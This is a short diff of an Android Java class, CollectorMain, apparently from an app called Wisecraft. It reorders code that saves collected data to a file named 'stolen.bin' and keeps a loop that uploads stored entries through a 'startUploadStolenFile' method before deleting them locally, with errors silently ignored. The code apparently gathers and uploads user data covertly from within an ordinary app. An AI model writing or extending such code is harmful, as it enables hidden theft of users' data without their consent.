@@ -36,17 +36,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		} catch (Throwable e) {
 
 		} finally {
-			FileOutputStream fos=null;
-			try {
-				fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
-				fos.write(sb.toBytes());
-			} catch (IOException e) {
-				
-			}finally{
-				try {
-					if(fos!=null)fos.close();
-				} catch (IOException e) {}
-			}
 			System.out.println(s);
 			//Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
 		}
@@ -63,9 +52,20 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				copyAndClose(new ByteArrayInputStream(sb.getString(filename,"").getBytes(CompatCharsets.UTF_8)), fu.startUploadStolenFile(filename));
 				sb.edit().remove(filename).commit();
 			} catch (Throwable e) {
-				e.printStackTrace();
+				e.printStackTrace(System.out);
 				continue;
 			}
+		}
+		FileOutputStream fos=null;
+		try {
+			fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
+			fos.write(sb.toBytes());
+		} catch (IOException e) {
+
+		}finally{
+			try {
+				if(fos!=null)fos.close();
+			} catch (IOException e) {}
 		}
 	}
 	public static class Infos {
